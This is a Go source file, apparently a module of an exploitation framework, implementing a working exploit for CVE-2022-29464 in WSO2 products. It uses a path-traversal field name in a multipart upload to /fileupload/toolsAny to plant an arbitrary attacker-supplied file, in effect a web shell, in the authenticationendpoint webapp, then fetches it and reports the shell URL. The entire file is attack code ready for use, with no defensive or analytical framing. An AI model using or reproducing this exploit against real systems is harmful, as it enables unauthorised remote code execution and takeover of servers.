package exp_wso2

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
)

type Exp_CVE_2022_29464_upload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_29464_upload) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	pathPrefix := "../../../../repository/deployment/server/webapps/authenticationendpoint/"

	postMultiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   pathPrefix + filename,
			FileName:    pathPrefix + filename,
			ContentType: "",
			Content:     []byte(content),
		},
	}

	// 发送请求
	httpresp := self.HttpPostMulti(goutils.SafeAddUri(self.Params.BaseParam.Target, "/fileupload/toolsAny", ""), postMultiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		expResult.Status = false
		return
	}

	shellUrl := goutils.SafeAddUri(self.Params.BaseParam.Target, "/authenticationendpoint/"+filename, "")
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		self.EchoSuccessMsg("shell: " + shellUrl)
		expResult.Status = true
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2022_29464_upload{}, "exp_cve_2022_29464_upload.yml")

}
